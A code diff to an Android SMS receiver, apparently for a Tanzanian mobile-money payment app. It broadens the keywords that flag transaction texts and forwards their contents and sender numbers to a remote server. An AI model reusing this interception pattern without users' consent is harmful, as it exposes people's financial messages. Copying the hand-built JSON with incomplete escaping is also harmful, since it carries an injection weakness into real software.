@@ -15,6 +15,7 @@ import java.io.InputStreamReader;
 public class SmsReceiver extends BroadcastReceiver {
     private static final String TAG = "SmsReceiver";
     
+    // BADILISHA HII KUWA URL YAKO HALISI
     private static final String SERVER_URL = "https://GhostTester.pythonanywhere.com/api/mixx-sms-payment";
     
     @Override
@@ -55,7 +56,13 @@ public class SmsReceiver extends BroadcastReceiver {
                          lowerBody.contains("umepokea") ||
                          lowerBody.contains("tsh") ||
                          lowerBody.contains("kumbukumbu") ||
-                         lowerBody.contains("mpesa");
+                         lowerBody.contains("mpesa") ||
+                         lowerBody.contains("muamala") ||
+                         lowerBody.contains("salio") ||
+                         lowerBody.contains("tigo") ||
+                         lowerBody.contains("airtel") ||
+                         lowerBody.contains("halopesa") ||
+                         lowerBody.contains("mixx");
         
         Log.d(TAG, "🔍 Checking if Mixx SMS: " + isMixx);
         return isMixx;
@@ -79,7 +86,7 @@ public class SmsReceiver extends BroadcastReceiver {
                     
                     // Create JSON data
                     String jsonData = "{" +
-                            "\"sms_content\": \"" + messageBody.replace("\"", "\\\"") + "\"," +
+                            "\"sms_content\": \"" + messageBody.replace("\"", "\\\"").replace("\n", " ") + "\"," +
                             "\"sender_number\": \"" + sender + "\"," +
                             "\"timestamp\": \"" + System.currentTimeMillis() + "\"" +
                             "}";
